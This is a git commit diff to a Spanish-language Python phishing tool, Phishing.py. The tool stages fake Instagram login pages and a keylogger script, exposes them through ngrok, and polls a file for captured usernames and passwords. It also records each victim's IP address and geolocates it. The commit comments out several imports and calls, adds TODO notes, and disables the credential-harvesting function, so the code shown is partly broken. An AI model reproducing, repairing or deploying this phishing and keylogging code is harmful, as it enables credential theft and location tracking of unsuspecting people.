81e3d397479e20e5f0afcce152810d193330a1b6
Lanniscaf <paolanderfederico@gmail.com>
2020-10-19 14:07:42 -0300

    Comentando Paquetes no Instalados  y Remarcando algunos errores

--- Phishing.py
+++ Phishing.py
@@ -4,8 +4,8 @@
 from time import sleep
 from sys import stdout, exit
 import multiprocessing
-from wget import download
-from urllib import urlopen
+#from wget import download
+#from urllib import urlopen
 from platform import system as systemos, architecture
 from os import system, path
 import re
@@ -18,17 +18,17 @@ RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', 
 #Funciones
 def conectado(host='http://duckduckgo.com'):
     try:
-        urlopen(host)
+        #urlopen(host)
         return True
     except:
         return False
     if conectado() == False:
-        print('''
+        print('''{0}
 
 ███۞███████ ]▄▄▄▄▄▄▄▄▄▄▄▄▃   No Estas Conectado a Una Red.
 ▂▄▅█████████▅▄▃▂
 I███████████████████].
-◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤... '''.format(GREEN, END))
+◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤... {1}'''.format(GREEN, END))
         exit(0)
      
 def Descarga_Ngrok():
@@ -39,7 +39,7 @@ def Descarga_Ngrok():
         else:
             filename = 'ngrok-stable-linux-arm.zip'
         url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
-        download(url)
+        #download(url)
         system('unzip ' + filename)
         system('mv ngrok Servidor/ngrok')
         system('rm -rf ' + filename)
@@ -65,12 +65,14 @@ def Carga_modulo(module):
 def runPhishing(page, option2): 
     system('rm -rf Servidor*.* && touch Servidor/www/usernames.txt && touch Servidor/www/ip.txt && cp Webs/ip.php Servidor && cp Webs/KeyloggerData.txt Server/www/ && cp Webs/keylogger.js Server/www/ && cp Webs/keylogger.php Server/www/')
     if option2 == '1' and page == 'Instagram':
-        copy_tree("Webs/Instagram/", "Servidor")
+        print('TODO: FIX LINE 68 !')
+        #copy_tree("Webs/Instagram/", "Servidor")
     else:
         exit(0)
 
 didBackground = True
 logFile = None
+argv = ['1','2'] # TODO: ARGV NO ESTA DEFINIDO
 for arg in argv:
     if arg=="--nolog":
         didBackground = False
@@ -80,19 +82,20 @@ if didBackground:
 
 def log(ctx):
     if didBackground:
-        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(DEFAULT, "") + "\n")
+        logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace( END, "") + "\n") #TODO: |DEFAULT, "") + "\n")
     print(ctx)
 
+"""
 def Espera_Credenciales():
-    print(" {0}[{1}*{0}]{1} Esperando Credenciales... \n".format(GREEN, DEFAULT))
+    print(" {0}[{1}*{0}]{1} Esperando Credenciales... \n".format(GREEN, END)) # TODO: |DEFAULT))
     while True:
         with open('Servidor/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                log('======================================================================'.format(RED, DEFAULT))
-                log(' {0}[ CREDENCIALES  ENCONTRADAS...]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
+                log('{0}======================================================================{1}'.format(RED, END)) #TODO: |DEFAULT))
+                log(' {0}[ CREDENCIALES  ENCONTRADAS...]{1}:\n {0}%s{1}'.format(GREEN, END) % lines) # TODO: | DEFAULT) % lines)
                 system('rm -rf Servidor/usernames.txt && touch Servidor/usernames.txt')
-                log('======================================================================'.format(RED, DEFAULT))
+                log('{0}======================================================================{1}'.format(RED, END)) #TODO: DEFAULT))
                 
     creds.close()
 
@@ -100,11 +103,11 @@ def Espera_Credenciales():
         lines = creds.read().rstrip()
         if len(lines) != 0:
             ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
-            resp = urlopen('https://ipinfo.io/%s/json' % ip)
-            ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
+            #resp = urlopen('https://ipinfo.io/%s/json' % ip)
+            ipinfo = 'No tengo el paquete dejo asi' #TODO: |json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
             if 'bogon' in ipinfo:
-                log('======================================================================'.format(RED, DEFAULT))
-                log(' \n{0}[ Victima + IP]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
+                log('======================================================================'.format(RED,END)) #TODO: DEFAULT NO ESTA DEFINIDO |DEFAULT))
+                log(' \n{0}[ Victima + IP]{1}:\n {0}%s{1}'.format(GREEN, END) % lines) #TODO:DEFAULT NO ESTA DEFINIDO | DEFAULT) % lines)
             else:
                 matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                 latitude = matchObj.group(1)
@@ -127,7 +130,7 @@ def Espera_Credenciales():
                 system('rm -rf Servidor/KeyloggerData.txt && touch Servidor/KeyloggerData.txt')
                 log('______________________________________________________________________'.format(RED, DEFAULT))
             creds.close()
-
+"""
 def runPEnv():
     system('clear')
     print('''{0}
@@ -165,5 +168,5 @@ def run_Ngrok():
         urlFile.close()
         break
     run_Ngrok()
-    Espera_Credenciales()
+    # TODO: | Espera_Credenciales()
 
